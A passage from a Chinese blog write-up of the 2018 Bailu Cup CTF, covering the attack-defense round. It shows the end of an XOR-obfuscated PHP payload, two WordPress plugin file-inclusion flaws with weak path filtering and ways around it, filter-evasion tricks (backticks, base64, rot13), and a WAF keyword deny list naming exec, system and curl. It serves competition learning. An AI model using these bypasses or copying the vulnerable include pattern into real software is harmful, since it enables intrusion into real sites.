class="string">"p"</span>) . (<span class="string">"&gt;"</span> ^ <span class="string">"j"</span>) . (<span class="string">"!"</span> ^ <span class="string">"z"</span>) . (<span class="string">"]"</span> ^ <span class="string">"&gt;"</span>) . (<span class="string">"@"</span> ^ <span class="string">"-"</span>) . (<span class="string">"["</span> ^ <span class="string">"?"</span>) . (<span class="string">"?"</span> ^ <span class="string">"b"</span>) . (<span class="string">"]"</span> ^ <span class="string">"t"</span>));</span><br></pre></td></tr></table></figure>
<p>后来发现两处文件包含。可以利用<code>./</code> 和<code>../</code> 分隔关键字绕过WAF，因为醒悟的比较晚和自动化做得不够方便，这个没有发挥太大作用。</p>
<p><code>wwwroot\wordpress\wp-content\plugins\localize-my-post\ajax\include.php</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Include WP base to have the basic WP functions</span></span><br><span class="line"><span class="keyword">include_once</span>($_SERVER[<span class="string">'DOCUMENT_ROOT'</span>] . <span class="string">"/wp-blog-header.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Set status 200 header</span></span><br><span class="line"><span class="comment">//Include requested file if it exists</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'file'</span>]))&#123;</span><br><span class="line">	$file=$_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">	$file = str_replace(<span class="string">'./'</span>,<span class="string">''</span>,$file);</span><br><span class="line">	header(<span class="string">'HTTP/1.1 200 OK'</span>);</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和 <code>wwwroot\wordpress\wp-content\plugins\site-editor\editor\extensions\pagebuilder\includes\ajax_shortcode_pattern.php</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[<span class="string">'ajax_path'</span>] ) )&#123;</span><br><span class="line">	$ajax_path=$_REQUEST[<span class="string">'ajax_path'</span>];</span><br><span class="line">	$ajax_path = str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$ajax_path);</span><br><span class="line">    <span class="keyword">require_once</span> $ajax_path;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>此外，有些队伍过滤了system，exe等关键字，采用反引号，base64编码，rot13编码等尝试绕过。</p>
<p>也许因为check机制不好使，某个时间开始大约一半以上的队伍选择关站保平安，即使只是访问对方主页也会被WAF拦截。这不难实现，只要在WAF里面把IP当关键字过滤掉就可以。这大概不太厚道吧，但黑客嘛，也许就是理解并打击规则？</p>
<p>没挖出啥洞，我好菜啊。而且WAF这么强，挖出来也用不上吧。</p>
<p><strong>defense</strong> </p>
<p>一开始就在WAF上把D盾扫出来的几个可疑文件加入黑名单，后来又配了敏感关键字<code>exec|system|exe|curl|flag|base64|filter|cmd|-7|{|rot13</code> 等，所以Web基本只在刚开始的几轮失分。</p>
<p>全程就是每轮打一下，看看WAF有没拦到有趣的东西，挣扎着试图挖到洞，以及尝试一些绕过关键字的方法。</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p><strong>attack</strong> </p>
<p>因为Web手比较菜:(，PWN手帮忙看了半天Web，开始搞PWN的时间比较晚，心态有点崩，最后思路来得晚，全程没打出分，很可惜。也许后面研究下王博的WP再复现一下。</p>
<p><strong>defense</strong> </p>
<p>权限问题动不了PWN文件，patch无门，基本坐着挨打。同样可能因为check机制的问题，存在一个fork炸弹躺下装死的防御思路。</p>
<h1 id="挨打要立正"><a href="#挨打要立正" class="headerlink" title="挨打要立正"></a>挨打要立正</h1><p>拿到两个第二确实是赛前没想到的，但这改变不了我菜的本质。队友们虽然比我强，但是也依然有很大进步空间，包括更扎实的基础，更熟练的操作，更灵活的思路，更默契的配合等等。</p>
<p>第一天突围赛刚开始比较顺利，最后五分钟被夜影师傅所在队伍反超，放上他们的逆向writeup：<a href="https://blog.csdn.net/whklhhhh/article/details/84454534" target="_blank" rel="noopener">181124 逆向-2018“柏鹭杯”厦大邀请赛初赛（Re1、2）</a> ，以弥补本文不足。</p>
<p>第二天AWD则全程被北航吊打，伏地膜。</p>
<p><del>因为看到某群里有人吐槽这是垃圾比赛，我觉得这个说法不太负责任，所以作为厦大学生多说两句。从题目来说。crypto一题有点脑洞，一题简单，一题中等，可以接受，misc也是相对合格的，Web题思路清晰，也有有趣的东西。reverse，PWN中也不乏质量不错的题，做出题的师傅也是认可其有自己特点的。</del></p>
<p><del>除了题目，比赛奖金也是很高的，闭幕式到场的嘉宾也是够级别的，比赛环境可以说相当不错，住宿交通也很人性化。从各个角度来说，这都可以算是一场有诚意的，有愿望办好且确实做得不错的比赛。所以不管是因为没被邀请、做不出题、确实感觉题目质量不行、现场厕所不够用、志愿者里面漂亮小姐姐不够多还是其他什么原因而觉得不爽的，吐槽时把话说清楚还是比较好的，免得引起不必要的误解。明年应该还会举办，欢迎路过的大佬来玩。</del></p>
<p><del>当然，要改进的东西还是蛮多的，反思不应该由我来做，简单说点自己的感受。最不理想的大概是AWD的check，这个称为健康检查的东西好像分不清怎样是健康。其次是使用WAF作为Web防守的工具固然可以让即使是像我这样的AWD经验不足的选手都可以很舒服，也减轻维护压力，但这样是没法打出刺激的AWD的，再加上check和我一样菜，除了没搞清楚状况的选手，有坚定原则的选手，很可能出现全场全线WAF，那就没啥好打的了。最后是PWN没有给选手patch的权限，这是不太正常的，直接导致最好的防护是把自己搞down，不管主办方是出于维护难度考虑还是什么，对真正有能力且想打一场有意思的比赛的选手来说游戏体验是不太好的。所以如果揪住这几点发表比较严厉的批评的话我是没话说的😔</del></p>
<p>最后，感谢队友带飞。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/181124-what-if-e-phi-not-coprime/" rel="next" title="如果RSA加密中的e和phi不互质">
                <i class="fa fa-chevron-left"></i> 如果RSA加密中的e和phi不互质
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/190308-run-aster-on-gce-or-locally/" rel="prev" title="使用谷歌云进行深度学习训练，以aster为例">
                使用谷歌云进行深度学习训练，以aster为例 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">findneo</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">74</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/findneo" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="javascript:alert(atob('ZGZpbmRuZW9AZ21haWwuY29t'))" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://twitter.com/findne0" target="_blank" title="Twitter">
                      
                        <i class="fa fa-fw fa-twitter"></i></a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ctftime.org/event/list/upcoming" title="CTFtime" target="_blank">CTFtime</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ginove.github.io/" title="Ginove" target="_blank">Ginove</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://lm0963.github.io/" title="Lm0963" target="_blank">Lm0963</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lzhtony.com" title="lzhtony" target="_blank">lzhtony</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://madsome.one/" title="Mads" target="_blank">Mads</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ph0en1x.com/" title="Ph0en1x-Team" target="_blank">Ph0en1x-Team</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://vancir.com/" title="Vancir" target="_blank">Vancir</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF"><span class="nav-number">1.</span> <span class="nav-text">CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.1.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto1"><span class="nav-number">1.1.1.</span> <span class="nav-text">Crypto1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#problem"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">problem</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#solve"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">solve</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto2"><span class="nav-number">1.1.2.</span> <span class="nav-text">Crypto2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto3"><span class="nav-number">1.1.3.</span> <span class="nav-text">Crypto3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#problem-1"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">problem</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#solve-1"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">solve</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">1.2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC1"><span class="nav-number">1.2.1.</span> <span class="nav-text">MISC1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC2"><span class="nav-number">1.2.2.</span> <span class="nav-text">MISC2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#problem-2"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">problem</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#solve-2"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">solve</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC3"><span class="nav-number">1.2.3.</span> <span class="nav-text">MISC3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.3.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web1"><span class="nav-number">1.3.1.</span> <span class="nav-text">Web1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web2"><span class="nav-number">1.3.2.</span> <span class="nav-text">Web2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AWD"><span class="nav-number">2.</span> <span class="nav-text">AWD</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-1"><span class="nav-number">2.1.</span> <span class="nav-text">Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">2.2.</span> <span class="nav-text">PWN</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#挨打要立正"><span class="nav-number">3.</span> <span class="nav-text">挨打要立正</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">findneo</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  

    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'https://findneo.github.io/181125-bailucup-writeup/';
          this.page.identifier = '181125-bailucup-writeup/';
          this.page.title = '2018 柏鹭杯 writeup';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://findneo.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  




	





  














  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  
  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>


  

</body>
</html>
